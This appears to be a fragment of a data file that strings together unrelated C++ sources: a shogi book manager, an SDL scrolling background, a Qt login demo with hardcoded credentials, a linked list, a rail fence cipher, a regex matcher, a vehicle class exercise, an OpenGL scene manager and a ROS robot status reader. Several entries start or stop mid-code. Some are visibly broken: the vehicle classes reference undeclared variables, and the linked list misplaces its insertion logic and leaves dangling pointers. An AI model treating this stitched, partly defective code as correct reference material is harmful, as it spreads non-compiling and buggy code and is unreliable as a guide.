boost::container::small_vector<Link, 1> links;\r\n    Leaf leaf = { 0, 0, false };\r\n    int8_t eval_value = 0;\r\n};\r\n\r\n// unorderd map \u672c\u4f53\r\nusing PositionMap = boost::unordered_map<std::pair<uint64_t, uint64_t>, Position, PairHash, PairEqual>;\r\n\r\n// \u30b0\u30ed\u30fc\u30d0\u30eb\u5909\u6570\u306e\u5ba3\u8a00\u3068\u5b9a\u7fa9\r\nextern PositionMap book_positions;\r\nPositionMap book_positions;\r\n\r\nclass PositionManager {\r\npublic:\r\n    // \u30ed\u30b0\u30ec\u30d9\u30eb\u4e00\u89a7\r\n    enum class LogLevel {\r\n        DEBUG,\r\n        INFO,\r\n        WARNING,\r\n        ERROR,\r\n        NONE\r\n    };\r\n\r\n    // \u6642\u9593\u30ab\u30a6\u30f3\u30c8\u3068\u30eb\u30fc\u30d7\u56de\u6570\u6e2c\u5b9a\r\n    std::chrono::steady_clock::time_point program_start_time;\r\n    size_t loop_count = 0;\r\n\r\n    // \u30dd\u30b8\u30b7\u30e7\u30f3\u30de\u30cd\u30fc\u30b8\u30e3\u30fc\u306e\u5909\u6570\u5ba3\u8a00\u90e8\u5206\r\n    std::string book_path;\r\n    std::string debug_log_path;\r\n    Position current_position;\r\n    std::string current_kifu;\r\n    mutable LogLevel log_level;\r\n    bool auto_adjust_log_level;\r\n    LogLevel adjusted_log_level;\r\n\r\n    // \u521d\u671f\u8a2d\u5b9a\u7b49\r\n    PositionManager(const std::string& book_path, const std::string& debug_log_path,\r\n        LogLevel level = LogLevel::ERROR,\r\n        bool auto_adjust = false,\r\n        LogLevel adjusted_level = LogLevel::INFO)\r\n        : book_path(book_path),\r\n        debug_log_path(debug_log_path),\r\n        current_position(),  // \u30c7\u30d5\u30a9\u30eb\u30c8\u521d\u671f\u5316\r\n        current_kifu(\"\"),\r\n        log_level(level),\r\n        auto_adjust_log_level(auto_adjust),\r\n        adjusted_log_level(adjusted_level) {\r\n        init_debug_log();\r\n    }\r\n\r\n    // \u30c7\u30d0\u30c3\u30b0\u30ed\u30b0\u51fa\u529b\u95a2\u6570\u672c\u4f53\r\n    void debug_log(const std::string& message, LogLevel level, bool is_adjustment_message = false) {\r\n        if (level >= log_level) {\r\n            std::ofstream log_file(debug_log_path, std::ios_base::app | std::ios_base::binary);\r\n            if (log_file.is_open()) {\r\n                log_file << message << std::endl;\r\n\r\n                // WARNING \u4ee5\u4e0a\u306e\u30ec\u30d9\u30eb\u3067\u30ed\u30b0\u51fa\u529b\u3055\u308c\u305f\u5834\u5408\u3001\u30ed\u30b0\u30ec\u30d9\u30eb\u3092\u81ea\u52d5\u8abf\u6574\r\n                if (!is_adjustment_message && auto_adjust_log_level && level >= LogLevel::WARNING && log_level > adjusted_log_level) {\r\n                    LogLevel previous_level = log_level;\r\n                    log_level = adjusted_log_level;\r\n\r\n                    std::string warning_message = \"Log level automatically adjusted from \"\r\n                        + log_level_to_string(previous_level) + \" to \"\r\n                        + log_level_to_string(log_level);\r\n\r\n                    // \u8abf\u6574\u30e1\u30c3\u30bb\u30fc\u30b8\u3092\u76f4\u63a5\u66f8\u304d\u8fbc\u307f\u3001\u518d\u5e30\u547c\u3073\u51fa\u3057\u3092\u907f\u3051\u308b\r\n                    log_file << warning_message << std::endl;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    // \u30c7\u30d0\u30c3\u30b0\u30ed\u30b0\u51fa\u529b\u7528\r\nprivate:\r\n    void init_debug_log() {\r\n        std::ofstream log_file(debug_log_path, std::ios_base::trunc | std::ios_base::binary);\r\n        if (log_file.is_open()) {\r\n            // UTF-8 BOM\u3092\u66f8\u304d\u8fbc\u3080\r\n            log_file << static_cast<char>(0xEF) << static_cast<char>(0xBB) << static_cast<char>(0xBF);\r\n            //\u6642\u523b\u3092\u8a18\u9332\r\n            auto now = std::chrono::system_clock::now();\r\n            auto now_c = std::chrono::system_clock::to_time_t(now);\r\n            std::tm local_tm;\r\n            localtime_s(&local_tm, &now_c);\r\n\r\n            log_file << \"[\" << std::put_time(&local_tm, \"%Y-%m-%d %H:%M:%S\") << \"] \"\r\n                << \"[\" << log_level_to_string(log_level) << \"]\" << std::endl;\r\n        }\r\n    }\r\n\r\nprivate:\r\n    // const \u4fee\u98fe\u5b50\u3092\u8ffd\u52a0\u3000\u30c7\u30d0\u30c3\u30b0\u51fa\u529b\u7528\r\n    std::string log_level_to_string(LogLevel level) const {\r\n        switch (level) {\r\n        case LogLevel::ERROR: return \"ERROR\";\r\n        case LogLevel::WARNING: return \"WARNING\";\r\n        case LogLevel::INFO: return \"INFO\";\r\n        case LogLevel::DEBUG: return \"DEBUG\";\r\n        default: return \"UNKNOWN\";\r\n        }\r\n    }\r\n};\r\n\r\n// config.ini \u8aad\u307f\u8fbc\u307f\u95a2\u6570\u3092\u4fee\u6b63\r\nstd::tuple<PositionManager::LogLevel, bool, PositionManager::LogLevel, int> read_config(const std::string& config_path) {\r\n    // \u8a2d\u5b9a\u30d5\u30a1\u30a4\u30eb\u3092\u958b\u304f\r\n    std::ifs",
    "#include \"BackgroundSpriteComponent.h\"\n\nBackgroundComponent::BackgroundComponent(Actor* owner, int draworder) \n\t:SpriteComponent(owner, draworder), mScrollSpeed(0.0f)\n{\n}\n/// <summary>\n///updates the offsets of\n///each background, taking to account when one image\n///moves all the way off the screen.This allows the images\n///to infinitely repeat\n/// </summary>\n/// <param name=\"deltaTime\"></param>\nvoid BackgroundComponent::Update(float deltaTime)\n{\n\tSpriteComponent::Update(deltaTime);\n\n\tfor (auto& bg : mBackgroundTextures)\n\t{\n\t\t//Update the x offset\n\t\tbg.mOffset.x += mScrollSpeed * deltaTime;\n\n\t\t//if this is compelety off the screen, reset offset to the right of the last background texture\n\t\tif (bg.mOffset.x < -mScreenSize.x)\n\t\t\tbg.mOffset.x = (mBackgroundTextures.size() - 1) * mScreenSize.x - 1;\n\t}\n}\n/// <summary>\n/// Draw function simply draws each background\n/// texture using SDL_RenderCopy, making sure to adjust\n/// the position based on the owner\u2019s position and the offset\n/// of that background.This achieves the simple scrolling\n/// behavior.\n/// </summary>\n/// <param name=\"renderer\"></param>\nvoid BackgroundComponent::Draw(SDL_Renderer* renderer)\n{\n\t// Draw each background texture\n\tfor (auto& bg : mBackgroundTextures)\n\t{\n\t\tSDL_Rect r;\n\t\t// Assume screen size dimensions\n\t\tr.w = static_cast<int>(mScreenSize.x);\n\t\tr.h = static_cast<int>(mScreenSize.y);\n\t\t// Center the rectangle around the position of the owner\n\t\tr.x = static_cast<int>(mOwner->GetPosition().x - r.w / 2 + bg.mOffset.x);\n\t\tr.y = static_cast<int>(mOwner->GetPosition().y - r.h / 2 + bg.mOffset.y);\n\n\t\t// Draw this background\n\t\tSDL_RenderCopy(renderer,\n\t\t\tbg.mTexture,\n\t\t\tnullptr,\n\t\t\t&r\n\t\t);\n\t}\n}\n\nvoid BackgroundComponent::SetBackgroundTextures(const std::vector<SDL_Texture*>& textures)\n{\n\t/**\n\tThe BackgroundTexture struct associates each background\n\ttexture with its corresponding offset. The offsets update\n\tevery frame to create the scrolling effect. So we need to\n\tinitialize the offsets in SetBackgroundTextures, positioning\n\teach background to the right of the previous one\n\t*/\n\tint count = 0;\n\n\tfor (auto texture : textures)\n\t{\n\t\tBackgroundTexture tempBackroundTexture;\n\n\t\ttempBackroundTexture.mTexture = texture;\n\n\t\t//Each texture is  screen width in offset\n\n\t\ttempBackroundTexture.mOffset.x = count * mScreenSize.x;\n\n\t\ttempBackroundTexture.mOffset.y = 0;\n\n\t\tmBackgroundTextures.emplace_back(tempBackroundTexture);\n\n\t\tcount++;\n\t}\n}\n",
    "#include \"mainwindow.h\"\r\n#include \"ui_mainwindow.h\"\r\n#include <QMessageBox>\r\n\r\nMainWindow::MainWindow(QWidget *parent)\r\n    : QMainWindow(parent)\r\n    , ui(new Ui::MainWindow)\r\n{\r\n    ui->setupUi(this);\r\n\r\n    connect(ui->pushButton, SIGNAL(clicked(bool)), this, SLOT(button()));\r\n}\r\n\r\nMainWindow::~MainWindow()\r\n{\r\n    delete ui;\r\n}\r\n\r\nvoid MainWindow::button()\r\n{\r\n    QString name[] = {\"abc\", \"def\", \"ghi\"};\r\n    QString code[] = {\"abc12\", \"def34\", \"ghi56\"};\r\n\r\n    QString uName = ui->lineEdit->text();\r\n    QString uCode = ui->lineEdit_2->text();\r\n\r\n    bool found= false;\r\n\r\n    for(int i = 0;i < name->length();i++){\r\n        if(uName == name[i] && uCode == code[i]){\r\n            QMessageBox::information(this, \"Welcome\", \"User \" + name[i] + \"\\n\"\r\n                                                          + \"succesfully logged in\");\r\n            found = true;\r\n            break;\r\n        }\r\n    }\r\n\r\n    if(!found){\r\n        QMessageBox::information(this, \"Error\", \"Invalid username or password\");\r\n    }\r\n}\r\n\r\n",
    "#include <iostream>\n\nstruct node \n{\n    int data;\n    struct node* prev;\n    struct node* next;\n};\n\nstruct node *head;   \nvoid InsertionBeginning();  \nvoid InsertionLast();  \nvoid InsertionSpecified();  \nvoid DeletionBeginning();  \nvoid DeletionLast();  \nvoid DeletionSpecified();  \nvoid Display();  \nvoid Search();\n\nint main ()  \n{  \n    int choice = 0;  \n    while(choice != 9)  \n    {  \n        std::cout << (\"\\n*********Main Menu*********\\n\");  \n        std::cout << (\"\\nChoose one option from the following list ...\\n\");  \n        std::cout << (\"\\n===============================================\\n\");  \n        std::cout << (\"\\n1.Insert in begining\\n2.Insert at last\\n3.Insert at any random location\\n4.Delete from Beginning\\n5.Delete from last\\n6.Delete the node after the given data\\n7.Search\\n8.Show\\n9.Exit\\n\");  \n        std::cout << (\"\\nEnter your choice?\\n\");  \n        std::cin >> choice;  \n        switch(choice)  \n        {  \n            case 1:  \n            InsertionBeginning();  \n            break;  \n            case 2:  \n            InsertionLast();  \n            break;  \n            case 3:  \n            InsertionSpecified();  \n            break;  \n            case 4:  \n            DeletionBeginning();  \n            break;  \n            case 5:  \n            DeletionLast();  \n            break;  \n            case 6:  \n            DeletionSpecified();  \n            break;  \n            case 7:  \n            Search();  \n            break;  \n            case 8:  \n            Display();  \n            break;  \n            case 9:  \n            exit(0);  \n            break;  \n            default:  \n            printf(\"Please enter valid choice..\");  \n        }  \n    }  \n    delete head;\n}  \n\nvoid InsertionBeginning()\n{\n    struct node* ptr = new node();\n    int value;\n\n    std::cout << \"\\nEnter item value\";\n    std::cin >> value;\n    if (head == nullptr)\n    {\n        ptr->data = value;\n        ptr->next = nullptr;\n        ptr->prev = nullptr;\n        head = ptr;\n    }\n    else\n    {\n        ptr->data = value;\n        ptr->prev = nullptr;\n        ptr->next = head;\n        head->prev = ptr;\n        head = ptr;\n    }\n    std::cout << \"\\nNode inserted\\n\";\n}  \nvoid InsertionLast()     \n{\n    struct node* ptr = new node();\n    struct node* temp;\n    int value;\n\n    std::cout << \"\\nEnter Value\";\n    std::cin >> value;\n    ptr->data = value;\n    if (head == nullptr)\n    {\n        head = ptr;\n    }\n    else \n    {\n        temp = head;\n        while (temp->next != nullptr)\n        {\n            temp = temp->next;\n        }\n        temp->next = ptr;\n        ptr->prev = temp;\n        ptr->next =nullptr;\n    }\n    std::cout << \"\\nNode inserted\\n\";\n}  \nvoid InsertionSpecified()\n{\n    struct node* ptr = new node();\n    struct node* temp;\n    int location, value, i;\n    \n    temp = head;\n    std::cout << \"Enter the location\\n\";\n    std::cin >> location;\n    for (i = 0; i < location; i++)\n    {\n        temp = temp->next;\n        if (temp == nullptr)\n        {\n            std::cout << \"\\nThere are less than \" << location << \"elements\";\n            return;\n        }\n        std::cout << \"Enter value\";\n        std::cin >> value;\n        \n        ptr->data = value;\n        ptr->next = temp->next;\n        ptr->prev = temp;\n        temp->next = ptr;\n        temp->next->prev = ptr;\n        std::cout << \"\\nNode Inserted\\n\";\n    }\n    \n}  \nvoid DeletionBeginning() \n{\n    struct node* ptr;\n    if (head == nullptr)\n    {\n        std::cout << \"\\nUnderflow\";\n    }\n    else if (head->next == nullptr)\n    {\n        delete head;\n        std::cout << \"\\nNode deleted\\n\";\n    }\n    else\n    {\n        ptr = head;\n        head = head->next;\n        head->prev = nullptr;\n        delete ptr;\n        std::cout << \"\\nNode Deleted\\n\";\n    }\n    \n}  \nvoid DeletionLast()      \n{\n    struct node *ptr;  \n    if(head == nullptr)  \n    {  \n        std::cout << \"\\n UNDERFLOW\";  \n    }  \n    else if(head->next == nullptr)  \n    {  \n           \n        delete head ;   \n        std::cout << \"\\nnode deleted\\n\";  \n    }  \n    else   \n    {  \n        ptr = head;   \n        if(ptr->next != nullptr)  \n        {  \n            ptr = ptr -> next;   \n        }  \n        ptr->prev->next = nullptr;   \n        delete ptr;  \n        std::cout << \"\\nnode deleted\\n\";  \n    }  \n}  \nvoid DeletionSpecified() \n{\n    struct node *ptr, *temp;  \n    int value;  \n    std::cout << \"\\n Enter the data after which the node is to be deleted : \";  \n    std::cin >> value;  \n    ptr = head;  \n    while(ptr -> data != value)  \n    ptr = ptr -> next;  \n    if(ptr -> next == nullptr)  \n    {  \n        std::cout << \"\\nCan't delete\\n\";  \n    }  \n    else if(ptr -> next -> next == nullptr)  \n    {  \n        ptr ->next = nullptr;  \n    }  \n    else  \n    {   \n        temp = ptr -> next;  \n        ptr->next = temp -> next;  \n        temp -> next -> prev = ptr;  \n        delete temp;  \n        std::cout << \"\\nnode deleted\\n\";  \n    }     \n}  \nvoid Display()           \n{\n    struct node *ptr;  \n   ",
    "#include <iostream>\n#include <string>\nusing namespace std;\nint main() {\n    while(true) {\n        // display welcome message and menu\n        cout << \" \" << endl; //this line is only to make the message appear correctly when the loop works\n        cout << \"----+----+----+----+----+----\" << endl;\n        cout << \"Welcome To Rail Fence Cipher!\" << endl;\n        cout << \"----+----+----+----+----+----\" << endl;\n        cout << \"Menu Options:\" << endl;\n        cout << \"1)Cipher a message\" << endl;\n        cout << \"2)Decipher a message\" << endl;\n        cout << \"3)Exit\" << endl;\n        //let the user know that the key value is 3 (the message appears in 3 rows)\n        cout << \"(( please note that the key value is 3! ))\" << endl;\n        cout << \"Please enter an option from 1,2,3 : \";\n        int option;\n        cin >> option;\n\n        //user chose to cipher a message\n        if (option == 1) {\n            string msg;\n            cout << \"please enter a message to cipher: \";\n            getline(cin, msg); //this line is only to avoid the effect of /n in the stream or any similar effect\n            // get message from user\n            getline(cin, msg);\n            //take only the alphabet(remove spaces, numbers, special characters) from message and make a new variable\n            string edited_msg = \"\";\n            for (char i: msg) {\n                if (isalpha(i)) {\n                    edited_msg += i;\n                }\n            }\n            cout << \"ciphered message is: \";\n            // the key is 3 which means we have 3 rows\n            //in the first row starting from the first letter in the message skip three letters and take the rest\n            for (int element = 0; element < edited_msg.length(); element += 4) {\n                cout << edited_msg[element];\n            }\n            //in the second row starting from the second letter in the message skip one letter and take the rest\n            for (int element = 1; element < edited_msg.length(); element += 2) {\n                cout << edited_msg[element];\n            }\n            //in the third row starting from the third letter in the message skip three letters and take the rest\n            for (int element = 2; element < edited_msg.length(); element += 4) {\n                cout << edited_msg[element];\n            }\n        }\n\n\n        //user chose to decipher a message\n        else if (option == 2) {\n            string msg;\n            cout << \"please enter a message to decipher: \";\n            getline(cin, msg);\n            getline(cin, msg);\n            string edited_msg = \"\";\n            //take only the alphabet(remove spaces, numbers, special characters) from message and make a new variable\n            for (char i: msg) {\n                if (isalpha(i)) {\n                    edited_msg += i;\n                }\n            }\n            // the size of the array is the key(3) as the number of rows and thne length of the message as the number of columns\n            char zigzag[3][edited_msg.length()];\n            string deciphered_msg = \"\";\n            //make an empty 2d array\n            for(int row = 0 ; row < 3 ; ++row){\n                for (int column = 0 ; column < edited_msg.length() ; ++column){\n                    zigzag[row][column] = 0;\n                }\n            }\n            //put a special character to track the zigzag\n            for(int row = 0 , column = 0 , d = 1 ; column < edited_msg.length() ; row += d , ++column ){\n                zigzag[row][column] = '-';\n                if(row == 3 - 1 ){d = -1 ;}\n                else if(row == 0){d = 1 ;}\n            }\n            //row by row place the letters instead of the special characters\n            int count = 0;\n            for(int row = 0 ; row < 3 ; ++row){\n                for(int column = 0 ; column < edited_msg.length() ; ++column ){\n                    if(zigzag[row][column] == '-'){\n                        zigzag[row][column] = edited_msg[count++];\n                    }\n                }\n            }\n            //read the zigzag of letters row by row to get the deciphered message\n            for(int row = 0 , column = 0 , d = 1 ; column < edited_msg.length() ; row += d , ++column){\n                deciphered_msg += zigzag[row][column];\n                if(row == 3 - 1 ){d = -1 ;}\n                else if(row == 0){d = 1 ;}\n            }\n            cout<< deciphered_msg ;\n\n        }\n\n\n        //user chose to exit program\n        else if (option == 3) {\n            cout << \"thanks for using our program\"<<endl;\n            break;\n        }\n        else if (isdigit(option) == false) {\n            cout << \"invalid input please enter 1 or 2 or 3 only\"<<endl;\n            break;\n        }\n        //user entered an invalid choice (anything other than 1 or 2 or 3)\n        else {\n            cout << \"invalid input please enter 1 or 2 or 3 only\";\n        }\n    }\n    return 0;\n}\n",
    "#include \"pattern_matcher.h\"\n\nbool contains_any(const std::string& text, const std::string& chars) {\n    return text.find_first_of(chars) != std::string::npos;\n}\n\nbool starts_with(const std::string& text, const std::string& prefix) {\n    return text.find(prefix) == 0;\n}\n\nbool ends_with(const std::string& text, const std::string& suffix) {\n    return text.rfind(suffix) == text.size() - suffix.size();\n}\n\nbool match_alternation(const std::string& text, const std::string& pattern) {\n    auto pos = pattern.find('|');\n    if (pos != std::string::npos) {\n        return match_pattern_rec(text, pattern.substr(0, pos)) ||\n               match_pattern_rec(text, pattern.substr(pos + 1));\n    }\n    return match_pattern_rec(text, pattern);\n}\n\nbool match_pattern_rec(const std::string& text, const std::string& pattern) {\n    if (pattern.empty()) return true;\n    if (text.empty()) return false;\n\n    if (pattern.substr(0, 2) == \"\\\\d\") {\n        if (isdigit(text[0])) {\n            return match_pattern_rec(text.substr(1), pattern.substr(2));\n        } else {\n            return match_pattern_rec(text.substr(1), pattern);\n        }\n    }\n\n    if (pattern.substr(0, 2) == \"\\\\w\") {\n        if (isalnum(text[0])) {\n            return match_pattern_rec(text.substr(1), pattern.substr(2));\n        } else {\n            return match_pattern_rec(text.substr(1), pattern);\n        }\n    }\n\n    if (pattern[0] == '[') {\n        auto closing_bracket = pattern.find(']');\n        bool is_negated = pattern[1] == '^';\n        if (is_negated) {\n            if (!contains_any(text, pattern.substr(2, closing_bracket - 2))) {\n                return match_pattern_rec(text.substr(1), pattern.substr(closing_bracket + 1));\n            } else {\n                return false;\n            }\n        }\n        if (contains_any(text, pattern.substr(1, closing_bracket - 1))) {\n            return match_pattern_rec(text.substr(1), pattern.substr(closing_bracket + 1));\n        } else {\n            return false;\n        }\n    }\n\n    if (pattern.size() > 1 && pattern[1] == '+') {\n        if (pattern[0] == text[0]) {\n            size_t i = 1;\n            while (i < text.size() && text[i] == pattern[0]) {\n                ++i;\n            }\n            return match_pattern_rec(text.substr(i), pattern.substr(2));\n        } else {\n            return false;\n        }\n    }\n\n    if (pattern.size() > 1 && pattern[1] == '?') {\n        if (pattern[0] == text[0]) {\n            return match_pattern_rec(text.substr(1), pattern.substr(2)) ||\n                   match_pattern_rec(text, pattern.substr(2));\n        } else {\n            return match_pattern_rec(text, pattern.substr(2));\n        }\n    }\n\n\n    if (pattern[0] == '.') {\n        return match_pattern_rec(text.substr(1), pattern.substr(1));\n    }\n\n\n    if (pattern[0] == '(') {\n        auto closing_paren = pattern.find(')');\n        return match_alternation(text, pattern.substr(1, closing_paren - 1)) &&\n               match_pattern_rec(text.substr(1), pattern.substr(closing_paren + 1));\n    }\n\n    if (pattern[0] == text[0]) {\n        return match_pattern_rec(text.substr(1), pattern.substr(1));\n    } else {\n        return match_pattern_rec(text.substr(1), pattern);\n    }\n}\n\nbool match_pattern(const std::string& text, const std::string& pattern) {\n    if (pattern[0] == '^') {\n        return starts_with(text, pattern.substr(1));\n    } else if (pattern[pattern.size() - 1] == '$') {\n        return ends_with(text, pattern.substr(0, pattern.size() - 1));\n    }\n\n    std::string remaining_text = text;\n    do {\n        if (match_pattern_rec(remaining_text, pattern)) {\n            return true;\n        }\n        remaining_text = remaining_text.substr(1);\n    } while (!remaining_text.empty());\n    return false;\n}\n",
    "#include<iostream>\r\nusing namespace std;\r\nclass Vehicle{\r\n    private:\r\n    string make,model;\r\n    int year;\r\n    public:\r\n    void inputData(){\r\n        cout<<\"Enter company name:\";\r\n        cin>>make;\r\n        cout<<\"Enter Model:\";\r\n        cin>>model;\r\n        cout<<\"Entire year:\";\r\n        cin>>year;\r\n    }\r\n    void display(){\r\n        cout<<\"Make:\"<<make<<endl;\r\n        cout<<\"Model:\"<<model<<endl;\r\n        cout<<\"Year:\"<<year<<endl;\r\n    }\r\n};\r\nclass Car:public Vehicle{\r\n    private:\r\n    int numDoor;\r\n    public:\r\n    void inputData(){\r\n        Vehicle::inputData();\r\n        cout<<\"Enter Number of Doors:\";\r\n        cin>>number;\r\n    }\r\n    void display(){\r\n        Vehicle::display();\r\n        cout<<\"Doors:\"<<numDoor<<endl;\r\n    }\r\n};\r\nclass ToyotaCar:public Car{\r\n    private:\r\n    string trimLevel;\r\n    \r\n    public:void inputData(){\r\n        Car::inputData();\r\n        cout<<\"Enter Trim Level:\";\r\n        cin>>TrimLevel;\r\n    }\r\n    void display(){\r\n        cout<<\"Trim Level:\"<<trimlevel<<endl;\r\n    }\r\n};\r\nmain(){\r\n    ToyotaCar myCar;\r\n    cout<<\"-----------Input Car Info--------\"<<endl;\r\n    myCar.inputData();\r\n    cout<<\"----------Output Car Info----------\"<<endl;\r\n    myCar.display();\r\n}",
    "///////////////////////////////////////////////////////////////////////////////\r\n// scenemanager.cpp\r\n// ============\r\n// manage the preparing and rendering of 3D scenes - textures, materials, lighting\r\n//\r\n//  AUTHOR: Brian Battersby - SNHU Instructor / Computer Science\r\n//\tCreated for CS-330-Computational Graphics and Visualization, Nov. 1st, 2023\r\n///////////////////////////////////////////////////////////////////////////////\r\n\r\n#include \"SceneManager.h\"\r\n\r\n#ifndef STB_IMAGE_IMPLEMENTATION\r\n#define STB_IMAGE_IMPLEMENTATION\r\n#include \"stb_image.h\"\r\n#endif\r\n\r\n#include <glm/gtx/transform.hpp>\r\n\r\n\r\n// declaration of global variables\r\nnamespace\r\n{\r\n\tconst char* g_ModelName = \"model\";\r\n\tconst char* g_ColorValueName = \"objectColor\";\r\n\tconst char* g_TextureValueName = \"objectTexture\";\r\n\tconst char* g_UseTextureName = \"bUseTexture\";\r\n\tconst char* g_UseLightingName = \"bUseLighting\";\r\n}\r\n\r\n/***********************************************************\r\n *  SceneManager()\r\n *\r\n *  The constructor for the class\r\n ***********************************************************/\r\nSceneManager::SceneManager(ShaderManager *pShaderManager)\r\n{\r\n\tm_pShaderManager = pShaderManager;\r\n\tm_basicMeshes = new ShapeMeshes();\r\n}\r\n\r\n/***********************************************************\r\n *  ~SceneManager()\r\n *\r\n *  The destructor for the class\r\n ***********************************************************/\r\nSceneManager::~SceneManager()\r\n{\r\n\tm_pShaderManager = NULL;\r\n\tdelete m_basicMeshes;\r\n\tm_basicMeshes = NULL;\r\n}\r\n\r\n/***********************************************************\r\n *  CreateGLTexture()\r\n *\r\n *  This method is used for loading textures from image files,\r\n *  configuring the texture mapping parameters in OpenGL,\r\n *  generating the mipmaps, and loading the read texture into\r\n *  the next available texture slot in memory.\r\n ***********************************************************/\r\nbool SceneManager::CreateGLTexture(const char* filename, std::string tag)\r\n{\r\n\tint width = 0;\r\n\tint height = 0;\r\n\tint colorChannels = 0;\r\n\tGLuint textureID = 0;\r\n\r\n\t// indicate to always flip images vertically when loaded\r\n\tstbi_set_flip_vertically_on_load(true);\r\n\r\n\t// try to parse the image data from the specified image file\r\n\tunsigned char* image = stbi_load(\r\n\t\tfilename,\r\n\t\t&width,\r\n\t\t&height,\r\n\t\t&colorChannels,\r\n\t\t0);\r\n\r\n\t// if the image was successfully read from the image file\r\n\tif (image)\r\n\t{\r\n\t\tstd::cout << \"Successfully loaded image:\" << filename << \", width:\" << width << \", height:\" << height << \", channels:\" << colorChannels << std::endl;\r\n\r\n\t\tglGenTextures(1, &textureID);\r\n\t\tglBindTexture(GL_TEXTURE_2D, textureID);\r\n\r\n\t\t// set the texture wrapping parameters\r\n\t\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\r\n\t\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\r\n\t\t// set texture filtering parameters\r\n\t\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\r\n\t\tglTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\r\n\r\n\t\t// if the loaded image is in RGB format\r\n\t\tif (colorChannels == 3)\r\n\t\t\tglTexImage2D(GL_TEXTURE_2D, 0, GL_RGB8, width, height, 0, GL_RGB, GL_UNSIGNED_BYTE, image);\r\n\t\t// if the loaded image is in RGBA format - it supports transparency\r\n\t\telse if (colorChannels == 4)\r\n\t\t\tglTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA8, width, height, 0, GL_RGBA, GL_UNSIGNED_BYTE, image);\r\n\t\telse\r\n\t\t{\r\n\t\t\tstd::cout << \"Not implemented to handle image with \" << colorChannels << \" channels\" << std::endl;\r\n\t\t\treturn false;\r\n\t\t}\r\n\r\n\t\t// generate the texture mipmaps for mapping textures to lower resolutions\r\n\t\tglGenerateMipmap(GL_TEXTURE_2D);\r\n\r\n\t\t// free the image data from local memory\r\n\t\tstbi_image_free(image);\r\n\t\tglBindTexture(GL_TEXTURE_2D, 0); // Unbind the texture\r\n\r\n\t\t// register the loaded texture and associate it with the special tag string\r\n\t\tm_textureIDs[m_loadedTextures].ID = textureID;\r\n\t\tm_textureIDs[m_loadedTextures].tag = tag;\r\n\t\tm_loadedTextures++;\r\n\r\n\t\treturn true;\r\n\t}\r\n\r\n\tstd::cout << \"Could not load image:\" << filename << std::endl;\r\n\r\n\t// Error loading the image\r\n\treturn false;\r\n}\r\n\r\n/***********************************************************\r\n *  BindGLTextures()\r\n *\r\n *  This method is used for binding the loaded textures to\r\n *  OpenGL texture memory slots.  There are up to 16 slots.\r\n ***********************************************************/\r\nvoid SceneManager::BindGLTextures()\r\n{\r\n\tfor (int i = 0; i < m_loadedTextures; i++)\r\n\t{\r\n\t\t// bind textures on corresponding texture units\r\n\t\tglActiveTexture(GL_TEXTURE0 + i);\r\n\t\tglBindTexture(GL_TEXTURE_2D, m_textureIDs[i].ID);\r\n\t}\r\n}\r\n\r\n/***********************************************************\r\n *  DestroyGLTextures()\r\n *\r\n *  This method is used for freeing the memory in all the\r\n *  used texture memory slots.\r\n ***********************************************************/\r\nvoid SceneManager::DestroyGLTextures()\r\n{\r\n\tfor (int i = 0; i < m_loadedTextures; i++)\r\n\t{\r\n\t\tglGenTextures(1, &m_textureIDs[i].ID);\r\n\t}\r\n}\r\n\r\n/************",
    "#include \"frcobot_hw/frcobot_hw.h\"\n#include <frcobot_hw/status.h>\n\nFrRobotStatusCtrl::FrRobotStatusCtrl()\n{\n\n    frrobot_status_ = nh_.advertise<frcobot_hw::status>(\"frcobot_status\", 10);\n\n    initTcp(); //Initialize the TCPIP connection with the robot\n}\n\nvoid FrRobotStatusCtrl::initTcp()\n{\n    nh_.getParam(\"robot_ip\", ROBOTIP);\n    nh_.getParam(\"robot_port\", PORT);\n    const char *robotIP = (char *)ROBOTIP.c_str();\n    if (nh_.hasParam(\"robot_ip\")) {\n        ROS_INFO(\"%s\", robotIP);\n        \n        ROS_INFO(\"%d\", PORT);\n    }\n    //Set the server address and listening port through the struct sockaddr_in structure;\n    memset(&serverSendAddr, 0, sizeof(serverSendAddr));\n    serverSendAddr.sin_family = AF_INET;\n    serverSendAddr.sin_addr.s_addr = inet_addr(robotIP);\n    serverSendAddr.sin_port = htons(PORT);\n    sendaddr_length = sizeof(serverSendAddr);\n\n    // Use socket() to generate a socket file descriptor;\n    if ((confd = socket(AF_INET, SOCK_STREAM, 0)) < 0)\n    {\n        ROS_INFO(\"socket() error\");\n        perror(\"socket() error\");\n        exit(1);\n    }\n\n    if (connect(confd, (struct sockaddr *)&serverSendAddr, sizeof(serverSendAddr)) < 0)\n    {\n        ROS_INFO(\"connect() error\");\n        perror(\"connect() error\");\n        exit(1);\n    }\n\n    ROS_INFO(\"connected to status server\");\n}\n\nvoid FrRobotStatusCtrl::read()\n{\n    recv_length = 0;\n    // Receive data from the server, recv();\n    recv_length = recv(confd, recv_buf, sizeof(recv_buf), 0);\n    if (recv_length <= 0)\n    {\n        perror(\"recv\");\n    }\n    else\n    {\n        frrobot_status.frame_count = recv_buf[2];\n        frrobot_status.program_state = recv_buf[5];\n        frrobot_status.error_code = recv_buf[6];\n        frrobot_status.robot_mode = recv_buf[7];\n\n        // joints\n        for (int j = 0; j < 6; j++)\n        {\n            for (int i = 0; i < 8; i++)\n            {\n                doubleByte[i] = recv_buf[(j+1)*8+i];\n            }\n            memcpy(&doubleTemp, doubleByte, sizeof(double));\n            frrobot_status.joints_sta[j] = doubleTemp;\n        }\n\n        // tcp\n        for (int j = 0; j < 6; j++)\n        {\n            for (int i = 0; i < 8; i++)\n            {\n                doubleByte[i] = recv_buf[(j+7)*8+i];\n            }\n            memcpy(&doubleTemp, doubleByte, sizeof(double));\n            frrobot_status.tcp_sta[j] = doubleTemp;\n        }\n\n        // torque\n        for (int j = 0; j < 6; j++)\n        {\n            for (int i = 0; i < 8; i++)\n            {\n                doubleByte[i] = recv_buf[int(j+13.5)*8+i];\n            }\n            memcpy(&doubleTemp, doubleByte, sizeof(double));\n            frrobot_status.torque_sta[j] = doubleTemp;\n        }\n\n        // tool_num\n        for (int i = 0; i < 4; i++)\n        {\n            intByte[i] 